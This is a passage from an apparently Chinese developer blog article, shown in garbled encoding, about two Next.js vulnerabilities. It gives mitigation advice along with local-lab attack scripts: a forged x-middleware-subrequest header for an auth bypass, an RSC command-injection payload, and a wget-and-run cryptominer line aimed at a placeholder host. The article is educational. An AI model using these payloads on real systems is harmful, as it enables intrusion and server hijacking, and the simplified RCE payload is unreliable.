<p>RCE æ¼æ´ï¼šApp Router ç”¨ RSC åè®®ä¼ è¾“ç»„ä»¶æ•°æ®ï¼ŒæœåŠ¡å™¨æ¥æ”¶æ•°æ®æ—¶æ²¡æ ¡éªŒï¼Œç›´æ¥æ‰§è¡Œé‡Œé¢çš„å‘½ä»¤ï¼Œç›¸å½“äºç»™æ”»å‡»è€…å¼€äº† â€œæœåŠ¡å™¨æ“ä½œæƒé™â€ã€‚</p>
</li>
</ul>
<h4 data-id="heading-4">3. æ ¸å¿ƒå±å®³ï¼ˆå‰ç«¯èƒ½æ„ŸçŸ¥çš„å½±å“ï¼‰</h4>
<ul>
<li>
<p>ç»•è¿‡æ¼æ´ï¼šåˆ«äººä¸ç”¨ç™»å½•å°±èƒ½è¿›åå°ï¼ˆå¦‚ <code>/admin</code>ï¼‰ï¼Œå·æ•æ„Ÿæ•°æ®ã€ç¯¡æ”¹å†…å®¹ã€‚</p>
</li>
<li>
<p>RCE æ¼æ´ï¼šæœ€è‡´å‘½ï¼æ”»å‡»è€…èƒ½æ“æ§æœåŠ¡å™¨ï¼Œå·æ•°æ®åº“å¯†ç ã€æ¤å…¥æŒ–çŸ¿ç¨‹åºï¼ˆè®©æœåŠ¡å™¨å˜ â€œè‚‰é¸¡â€ï¼‰ã€åˆ é™¤ä¸šåŠ¡æ•°æ®ï¼Œç”šè‡³ç˜«ç—ªæœåŠ¡ã€‚</p>
</li>
</ul>
<h4 data-id="heading-5">4. å¿«é€Ÿé¢„é˜²æ–¹æ¡ˆï¼ˆå‰ç«¯ç›´æ¥èƒ½ç”¨ï¼‰</h4>
<ol>
<li>
<p>ä¼˜å…ˆå‡çº§ï¼šæŒ‰ç‰ˆæœ¬å¯¹åº”å‡çº§ï¼ˆ15.xâ†’â‰¥15.3.6ï¼›14.xâ†’â‰¥14.2.25ï¼›13.xâ†’â‰¥13.5.9ï¼‰ã€‚</p>
</li>
<li>
<p>ä¸´æ—¶é˜²æŠ¤ï¼šç”¨ Nginx/Cloudflare æ‹¦æˆª <code>x-middleware-subrequest</code> è¯·æ±‚å¤´ï¼ˆç¦æ­¢å¤–éƒ¨æäº¤ï¼‰ã€‚</p>
</li>
<li>
<p>ä»£ç å±‚é¢ï¼šå…³é”®è·¯ç”±ï¼ˆå¦‚ç™»å½•ã€æ”¯ä»˜ï¼‰ä¸è¦åªé ä¸­é—´ä»¶æ ¡éªŒï¼ŒåŠ äºŒæ¬¡éªŒè¯ï¼ˆå¦‚æ¥å£å±‚æŸ¥ token æœ‰æ•ˆæ€§ï¼‰ã€‚</p>
</li>
</ol>
<h4 data-id="heading-6">5. æ¶‰åŠæ ¸å¿ƒçŸ¥è¯†ç‚¹ï¼ˆå‰ç«¯å…³è”æŠ€èƒ½ï¼‰</h4>
<ul>
<li>
<p>Next.js ä¸­é—´ä»¶ï¼šè¿è¡Œåœ¨è¯·æ±‚æœ€å‰é¢çš„æ ¡éªŒé€»è¾‘ï¼Œä¸æ˜¯å‰ç«¯ä»£ç ï¼Œæ˜¯æœåŠ¡ç«¯è½»é‡å‡½æ•°ã€‚</p>
</li>
<li>
<p>RSCï¼ˆReact Server Componentsï¼‰ï¼šApp Router æ ¸å¿ƒï¼ŒæœåŠ¡ç«¯æ¸²æŸ“ç»„ä»¶çš„åè®®ï¼Œæ•°æ®ä¼ è¾“è¦æ ¡éªŒã€‚</p>
</li>
<li>
<p>è¯·æ±‚ä¼ªé€ ï¼šå®¢æˆ·ç«¯å¯ç¯¡æ”¹è¯·æ±‚å¤´ / è¯·æ±‚ä½“ï¼ŒæœåŠ¡ç«¯ä¸èƒ½ â€œæ— æ¡ä»¶ä¿¡ä»»â€ã€‚</p>
</li>
<li>
<p>ä¾èµ–å®‰å…¨ï¼šæ¡†æ¶åº•å±‚æ¼æ´åªèƒ½é å‡çº§ä¿®å¤ï¼Œå®šæœŸç”¨ <code>npm audit</code> æŸ¥æ¼æ´ã€‚</p>
</li>
</ul>
<hr/>
<h3 data-id="heading-7">äºŒã€æ”»å‡»ä»£ç ç¤ºä¾‹ï¼ˆä»…ç”¨äºå­¦ä¹ ï¼Œä¸¥ç¦éæ³•ä½¿ç”¨ï¼‰</h3>
<blockquote>
<p>âš ï¸ æ³¨æ„äº‹é¡¹ï¼š</p>
</blockquote>
<ol>
<li>
<p>ä»¥ä¸‹ä»£ç ä»…ç”¨äº <strong>æ¼æ´åŸç†å­¦ä¹ </strong>ï¼Œä¸¥ç¦ç”¨äºæ”»å‡»çœŸå®ç½‘ç«™ï¼Œå¦åˆ™éœ€æ‰¿æ‹…æ³•å¾‹è´£ä»»ï¼</p>
</li>
<li>
<p>æµ‹è¯•ä»…å…è®¸åœ¨è‡ªå·±æ­å»ºçš„æ¼æ´ç¯å¢ƒï¼ˆå¦‚æœ¬åœ°éƒ¨ç½²å—å½±å“ç‰ˆæœ¬çš„ Next.js é¡¹ç›®ï¼‰ä¸­è¿›è¡Œã€‚</p>
</li>
<li>
<p>æ¼”ç¤ºè„šæœ¬èšç„¦ â€œæ”»å‡»æ ¸å¿ƒé€»è¾‘â€ï¼Œçœç•¥äº†çœŸå®æ”»å‡»ä¸­çš„æ‰«æã€æŒä¹…åŒ–ç­‰æ­¥éª¤ï¼Œçªå‡º â€œå¦‚ä½•è§¦å‘æ¼æ´â€ã€‚</p>
</li>
</ol>
<h4 data-id="heading-8">ï¼ˆä¸€ï¼‰CVE-2025-29927ï¼ˆèº«ä»½éªŒè¯ç»•è¿‡æ¼æ´ï¼‰æ”»å‡»ç¤ºä¾‹</h4>
<h5 data-id="heading-9">æ¼æ´æ ¸å¿ƒ</h5>
<p>ä¼ªé€  <code>x-middleware-subrequest</code> è¯·æ±‚å¤´ï¼Œç»•è¿‡ä¸­é—´ä»¶çš„ç™»å½•æ ¡éªŒï¼Œç›´æ¥è®¿é—®å—ä¿æŠ¤è·¯ç”±ï¼ˆå¦‚ <code>/admin</code>ï¼‰ã€‚</p>
<h5 data-id="heading-10">æ”»å‡»è„šæœ¬ï¼š<code>bypass-auth.js</code></h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// éœ€å…ˆæ‰§è¡Œï¼šnpm install axios</span>

<span class="hljs-keyword">const</span> axios = <span class="hljs-built_in">require</span>(<span class="hljs-string">'axios'</span>);

<span class="hljs-comment">// ç›®æ ‡åœ°å€ï¼ˆè‡ªå·±æ­å»ºçš„æµ‹è¯•é¡¹ç›®ï¼‰</span>

<span class="hljs-keyword">const</span> targetUrl = <span class="hljs-string">'http://localhost:3000/admin'</span>;

<span class="hljs-comment">// æ ¸å¿ƒï¼šä¼ªé€ è¯·æ±‚å¤´ï¼Œè§¦å‘ä¸­é—´ä»¶ç»•è¿‡</span>

<span class="hljs-keyword">const</span> attackConfig = {

   <span class="hljs-attr">headers</span>: {

     <span class="hljs-comment">// å…³é”®ï¼šæ‹¼æ¥ 5 æ¬¡åˆæ³•æ ‡è¯†ï¼Œè§¦å‘æ–°ç‰ˆæœ¬æ¼æ´ç»•è¿‡</span>

     <span class="hljs-string">'x-middleware-subrequest'</span>: <span class="hljs-string">'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware'</span>,

     <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'</span> <span class="hljs-comment">// ä¼ªè£…æµè§ˆå™¨</span>

   }

};

<span class="hljs-comment">// å‘é€æ”»å‡»è¯·æ±‚</span>

axios.<span class="hljs-title function_">get</span>(targetUrl, attackConfig)

   .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> {

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ”»å‡»ç»“æœï¼š'</span>);

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'çŠ¶æ€ç ï¼š'</span>, response.<span class="hljs-property">status</span>);

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å“åº”å†…å®¹ï¼ˆå‰500å­—ç¬¦ï¼‰ï¼š'</span>, response.<span class="hljs-property">data</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">500</span>));

     <span class="hljs-keyword">if</span> (response.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) {

       <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'âœ… èº«ä»½éªŒè¯ç»•è¿‡æˆåŠŸï¼å·²è®¿é—®å—ä¿æŠ¤çš„ /admin è·¯ç”±'</span>);

     }

   })

   .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> {

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ”»å‡»å¤±è´¥ï¼š'</span>, error.<span class="hljs-property">message</span>);

   });
</code></pre>
<h5 data-id="heading-11">æµ‹è¯•ç¯å¢ƒæ­å»ºï¼ˆæœ¬åœ°å¤ç°ç”¨ï¼‰</h5>
<ol>
<li>æ–°å»ºå—å½±å“ç‰ˆæœ¬çš„ Next.js é¡¹ç›®ï¼ˆå¦‚ 15.2.2ï¼‰ï¼š</li>
</ol>
<pre><code class="hljs language-lua" lang="lua">npx <span class="hljs-built_in">create</span>-<span class="hljs-built_in">next</span>-app@<span class="hljs-number">15.2</span><span class="hljs-number">.2</span> test-vuln-project

cd test-vuln-project
</code></pre>
<ol>
<li>åˆ›å»ºä¸­é—´ä»¶ <code>src/middleware.js</code>ï¼ˆæ¨¡æ‹Ÿç™»å½•æ ¡éªŒï¼‰ï¼š</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">NextResponse</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'next/server'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params">req</span>) {

   <span class="hljs-comment">// ç®€å•æ ¡éªŒï¼šæ²¡æœ‰ç™»å½• cookie å°±æ‹¦æˆªè·³è½¬åˆ°ç™»å½•é¡µ</span>

   <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">cookies</span>.<span class="hljs-property">token</span>) {

     <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">redirect</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">'/login'</span>, req.<span class="hljs-property">url</span>));

   }

   <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();

}

<span class="hljs-comment">// ä»…å¯¹ /admin è·¯ç”±ç”Ÿæ•ˆ</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> config = { <span class="hljs-attr">matcher</span>: <span class="hljs-string">'/admin'</span> };
</code></pre>
<ol>
<li>åˆ›å»º <code>/admin</code> é¡µé¢ <code>app/admin/page.js</code>ï¼š</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">AdminPage</span>(<span class="hljs-params"/>) {

   <span class="hljs-keyword">return</span> åå°ï¼ˆä»…ç™»å½•å¯è§ï¼‰\&lt;/h1&gt;;

}
</code></pre>
<h5 data-id="heading-12">è¿è¡Œæ­¥éª¤</h5>
<ol>
<li>
<p>å¯åŠ¨æµ‹è¯•é¡¹ç›®ï¼š<code>npm run dev</code></p>
</li>
<li>
<p>è¿è¡Œæ”»å‡»è„šæœ¬ï¼š<code>node bypass-auth.js</code></p>
</li>
<li>
<p>é¢„æœŸç»“æœï¼šæ— éœ€ç™»å½• cookieï¼Œæ§åˆ¶å°è¾“å‡º 200 çŠ¶æ€ç å’Œ admin é¡µé¢å†…å®¹ï¼Œç»•è¿‡æˆåŠŸã€‚</p>
</li>
</ol>
<hr/>
<h4 data-id="heading-13">ï¼ˆäºŒï¼‰CVE-2025-66478ï¼ˆRSC è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼‰æ”»å‡»ç¤ºä¾‹</h4>
<h5 data-id="heading-14">æ¼æ´æ ¸å¿ƒ</h5>
<p>æ„é€ ç¬¦åˆ RSC åè®®æ ¼å¼çš„ POST è¯·æ±‚ä½“ï¼Œæ³¨å…¥ç³»ç»Ÿå‘½ä»¤ï¼ˆå¦‚ <code>whoami</code>ï¼‰ï¼ŒæœåŠ¡å™¨ä¼šç›´æ¥æ‰§è¡Œè¯¥å‘½ä»¤ã€‚</p>
<h5 data-id="heading-15">æ”»å‡»è„šæœ¬ï¼š<code>rce-attack.js</code></h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// éœ€å…ˆæ‰§è¡Œï¼šnpm install axios</span>

<span class="hljs-keyword">const</span> axios = <span class="hljs-built_in">require</span>(<span class="hljs-string">'axios'</span>);

<span class="hljs-comment">// ç›®æ ‡åœ°å€ï¼ˆå¯ç”¨ App Router çš„å—å½±å“ç‰ˆæœ¬é¡¹ç›®ï¼‰</span>

<span class="hljs-keyword">const</span> targetUrl = <span class="hljs-string">'http://localhost:3000'</span>;

<span class="hljs-comment">// æ ¸å¿ƒï¼šæ„é€  RSC åè®®çš„æ¶æ„è¯·æ±‚ä½“ï¼Œæ³¨å…¥ç³»ç»Ÿå‘½ä»¤</span>

<span class="hljs-keyword">const</span> maliciousBody = {

   <span class="hljs-comment">// RSC åè®®å›ºå®šæ ¼å¼å­—æ®µï¼ˆç®€åŒ–ç‰ˆï¼Œæ¨¡æ‹Ÿåˆæ³•è¯·æ±‚ï¼‰</span>

   <span class="hljs-attr">id</span>: <span class="hljs-string">'123'</span>,

   <span class="hljs-attr">chunks</span>: \[

     <span class="hljs-comment">// æ³¨å…¥æ¶æ„å‘½ä»¤ï¼šWindows ç”¨ "whoami"ï¼ŒLinux/Mac ç”¨ "id"</span>

     <span class="hljs-string">'{"type":"invoke","args":\[";whoami;"]}'</span>

   ],

   <span class="hljs-attr">version</span>: <span class="hljs-string">'0.1'</span>,

   <span class="hljs-attr">mode</span>: <span class="hljs-string">'server-component'</span>

};

<span class="hljs-comment">// å‘é€æ”»å‡»è¯·æ±‚ï¼ˆRSC æ¼æ´é€šè¿‡ POST / è§¦å‘ï¼‰</span>

axios.<span class="hljs-title function_">post</span>(targetUrl, maliciousBody, {

   <span class="hljs-attr">headers</span>: {

     <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>,

     <span class="hljs-string">'Accept'</span>: <span class="hljs-string">'text/x-component'</span> <span class="hljs-comment">// RSC åè®®è¦æ±‚çš„ Accept å¤´</span>

   }

})

   .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> {

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ”»å‡»ç»“æœï¼š'</span>);

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'çŠ¶æ€ç ï¼š'</span>, response.<span class="hljs-property">status</span>);

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å“åº”å†…å®¹ï¼š'</span>, response.<span class="hljs-property">data</span>);

     <span class="hljs-comment">// æ ¡éªŒå‘½ä»¤æ‰§è¡Œç»“æœï¼ˆåŒ…å«è·¯å¾„åˆ†éš”ç¬¦å³ä¸ºæˆåŠŸï¼‰</span>

     <span class="hljs-keyword">if</span> (response.<span class="hljs-property">data</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'/'</span>) || response.<span class="hljs-property">data</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'\\\\'</span>)) {

       <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'âœ… è¿œç¨‹ä»£ç æ‰§è¡ŒæˆåŠŸï¼å·²è·å–æœåŠ¡å™¨ç”¨æˆ·ä¿¡æ¯'</span>);

     }

   })

   .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> {

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ”»å‡»å¤±è´¥ï¼š'</span>, error.<span class="hljs-property">response</span>?.<span class="hljs-property">data</span> || error.<span class="hljs-property">message</span>);

   });
</code></pre>
<h5 data-id="heading-16">æµ‹è¯•ç¯å¢ƒæ­å»ºï¼ˆæœ¬åœ°å¤ç°ç”¨ï¼‰</h5>
<ol>
<li>æ–°å»ºå—å½±å“ç‰ˆæœ¬çš„ Next.js é¡¹ç›®ï¼ˆå¦‚ 15.3.3ï¼‰ï¼š</li>
</ol>
<pre><code class="hljs language-lua" lang="lua">npx <span class="hljs-built_in">create</span>-<span class="hljs-built_in">next</span>-app@<span class="hljs-number">15.3</span><span class="hljs-number">.3</span> test-rce-project

cd test-rce-project
</code></pre>
<ol>
<li>å¯ç”¨ App Routerï¼ˆé»˜è®¤å·²å¯ç”¨ï¼Œç¡®ä¿ <code>app/page.js</code> å­˜åœ¨ï¼‰ï¼š</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// app/page.js</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Home</span>(<span class="hljs-params"/>) {

   <span class="hljs-keyword">return</span> &gt;<span class="hljs-title class_">Next</span>.<span class="hljs-property">js</span> <span class="hljs-title class_">App</span> <span class="hljs-title class_">Router</span> æµ‹è¯•é¡µ;

}
</code></pre>
<h5 data-id="heading-17">è¿è¡Œæ­¥éª¤</h5>
<ol>
<li>
<p>å¯åŠ¨æµ‹è¯•é¡¹ç›®ï¼š<code>npm run dev</code></p>
</li>
<li>
<p>è¿è¡Œæ”»å‡»è„šæœ¬ï¼š<code>node rce-attack.js</code></p>
</li>
<li>
<p>é¢„æœŸç»“æœï¼š</p>
</li>
</ol>
<ul>
<li>
<p>Windows ç³»ç»Ÿï¼šå“åº”ä¸­è¿”å› <code>DESKTOP-XXX\ç”¨æˆ·å</code></p>
</li>
<li>
<p>Linux/Mac ç³»ç»Ÿï¼šå“åº”ä¸­è¿”å› <code>www-data</code> æˆ–å½“å‰ç”¨æˆ·èº«ä»½</p>
</li>
<li>
<p>æ§åˆ¶å°è¾“å‡º â€œè¿œç¨‹ä»£ç æ‰§è¡ŒæˆåŠŸâ€</p>
</li>
</ul>
<blockquote>
<p>ğŸ“Œ æ³¨ï¼šçœŸå®æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…ä¼šå°†</p>
<p><code>whoami</code></p>
<p>æ›¿æ¢ä¸ºæ¶æ„å‘½ä»¤ï¼Œä¾‹å¦‚ï¼š</p>
</blockquote>
<pre><code class="hljs language-json" lang="json">'<span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"invoke"</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span>\<span class="hljs-punctuation">[</span><span class="hljs-string">";wget http://æ¶æ„åœ°å€/æŒ–çŸ¿è„šæœ¬.sh &amp;&amp; chmod +x æŒ–çŸ¿è„šæœ¬.sh &amp;&amp; ./æŒ–çŸ¿è„šæœ¬.sh;"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">}</span>'
</code></pre>
<p>æœ¬ç¤ºä¾‹ä»…ç”¨ <code>whoami</code> æ¼”ç¤ºåŸç†ï¼Œåˆ‡å‹¿ç”¨äºéæ³•ç”¨é€”ã€‚</p>
<hr/>
<h3 data-id="heading-18">ä¸‰ã€å‰ç«¯å…³é”®æé†’</h3>
<ol>
<li>
<p><strong>æ¼æ´æœ¬è´¨</strong>ï¼šéƒ½æ˜¯ â€œä¿¡ä»»äº†å®¢æˆ·ç«¯è¾“å…¥â€â€”â€” ä¸­é—´ä»¶ä¿¡äº†ä¼ªé€ çš„è¯·æ±‚å¤´ï¼ŒæœåŠ¡å™¨ä¿¡äº†ä¼ªé€ çš„ RSC æ•°æ®ï¼Œæ ¸å¿ƒæ˜¯ â€œæœåŠ¡ç«¯æœªåšä¸¥æ ¼æ ¡éªŒâ€ã€‚</p>
</li>
<li>
<p><strong>ä¿®å¤åŸåˆ™</strong>ï¼šæ¡†æ¶åº•å±‚æ¼æ´ï¼Œå‰ç«¯ä»£ç æ— æ³•ç›´æ¥é˜²å¾¡ï¼å¿…é¡»å‡çº§ Next.js åˆ°å®‰å…¨ç‰ˆæœ¬ï¼ˆè¿™æ˜¯æœ€æ ¹æœ¬ã€æœ€é è°±çš„æ–¹æ¡ˆï¼‰ã€‚</p>
</li>
<li>
<p><strong>é¢å¤–é˜²æŠ¤</strong>ï¼š</p>
</li>
</ol>
<ul>
<li>
<p>å…³é”®è·¯ç”±ï¼ˆç™»å½•ã€æ”¯ä»˜ã€åå°ï¼‰å¿…é¡»åŠ  â€œåŒé‡æ ¡éªŒâ€ï¼ˆä¸­é—´ä»¶ + æ¥å£å±‚ token éªŒè¯ï¼‰ï¼Œä¸è¦å•é ä¸­é—´ä»¶ã€‚</p>
</li>
<li>
<p>è‡ªæ‰˜ç®¡é¡¹ç›®éœ€åœ¨ Nginx/Cloudflare å±‚æ‹¦æˆªæ¶æ„è¯·æ±‚å¤´ï¼ˆå¦‚ <code>x-middleware-subrequest</code>ï¼‰ã€‚</p>
</li>
</ul>
<ol>
<li><strong>æ—¥å¸¸ä¹ æƒ¯</strong>ï¼š</li>
</ol>
<ul>
<li>
<p>å®šæœŸæ‰§è¡Œ <code>npm audit</code> æ‰«æä¾èµ–æ¼æ´ï¼ŒåŠæ—¶æ›´æ–°è¡¥ä¸ç‰ˆæœ¬ã€‚</p>
</li>
<li>
<p>å…³é”®ä¸šåŠ¡ä¼˜å…ˆä½¿ç”¨ Vercel æ‰˜ç®¡ï¼ˆå®˜æ–¹è‡ªå¸¦æ¼æ´é˜²æŠ¤ï¼Œè‡ªåŠ¨å±è”½éƒ¨åˆ†æ”»å‡»ï¼‰ã€‚</p>
</li>
<li>
<p>æœåŠ¡å™¨å¯ç”¨ä¸»æœºå®‰å…¨å·¥å…·ï¼Œç›‘æ§å¼‚å¸¸è¿›ç¨‹å’Œæ–‡ä»¶ä¸‹è½½ã€‚</p>
</li>
</ul>
<blockquote>
<p>æœ€åæ„Ÿè°¢é˜…è¯»ï¼æ¬¢è¿å…³æ³¨æˆ‘ï¼Œå¾®ä¿¡å…¬ä¼—å·ï¼š<code>ã€Šé²«å°é±¼ä¸æ­£ç»ã€‹</code>ã€‚æ¬¢è¿ç‚¹èµã€æ”¶è—ã€å…³æ³¨ï¼Œä¸€é”®ä¸‰è¿ï¼ï¼ï¼</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[5å°æ—¶æ•´ç†60é¡µã€ŠGoogle AgentæŒ‡å—ã€‹ï¼Œä¸æ‡‚Agentçš„åŒ…æ•™åŒ…ä¼š]]></title>    <link>https://juejin.cn/post/7581765536372965385</link>    <guid>https://juejin.cn/post/7581765536372965385</guid>    <pubDate>2025-12-10T03:55:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581765536372965385" data-draft-id="7581765536372949001" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="5å°æ—¶æ•´ç†60é¡µã€ŠGoogle AgentæŒ‡å—ã€‹ï¼Œä¸æ‡‚Agentçš„åŒ…æ•™åŒ…ä¼š"/> <meta itemprop="keywords" content="Agent,LLM,ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2025-12-10T03:55:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§æ¨¡å‹æ•™ç¨‹"/> <meta itemprop="url" content="https://juejin.cn/user/1145012233707299"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            5å°æ—¶æ•´ç†60é¡µã€ŠGoogle AgentæŒ‡å—ã€‹ï¼Œä¸æ‡‚Agentçš„åŒ…æ•™åŒ…ä¼š
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1145012233707299/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§æ¨¡å‹æ•™ç¨‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:55:59.000Z" title="Wed Dec 10 2025 03:55:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»20åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body 